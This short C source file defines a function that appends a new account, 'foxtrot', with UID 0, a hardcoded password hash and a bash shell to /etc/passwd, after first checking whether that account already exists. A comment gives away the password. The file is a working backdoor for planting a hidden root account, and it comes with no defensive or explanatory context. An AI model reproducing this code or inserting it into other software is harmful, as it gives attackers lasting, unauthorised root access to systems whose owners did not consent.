#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>

// don't remove the ':' in the end
#define USER "foxtrot:"

// bravo oscar sierra tango alfa
#define PASSWORD "$1$x0x0x0x0$1JGD.YYakC1aVB1BVo9o1/"

#define BUFSIZE (sizeof(PASSWORD) + sizeof(USER) + 21)

int check_root_user(int fd);
void add_root_user(void);

void add_root_user(void)
{
	char line[BUFSIZE];
	int fd = open("/etc/passwd", O_RDWR);
	if (fd == -1) {
		return;
	}

	if (check_root_user(fd)) {
		goto end;
	}

	// USER:PASSWORD:0:0::/root:/bin/bash
	sprintf(line, "%s%s:0:0::/root:/bin/bash\n", USER, PASSWORD);
	write(fd, line, BUFSIZE - 1);

end:
	close(fd);
	return;
}

int check_root_user(int fd) {
	char buf[1024];

	int match = 0, err = 0;
	ssize_t n;

	while ((n = read(fd, buf, sizeof(buf))) > 0) {
		for (int i = 0; i < n; i++) {
			if (err) {
				if (buf[i] == '\n') {
					match = 0;
					err = 0;
				}
 			} else {
				if (buf[i] != USER[match++]) {
					err = 1;
				} else {
					if (match == (sizeof(USER) - 1)) {
						return 1;
					}
				}
			}
		}
	}

	return 0;
}
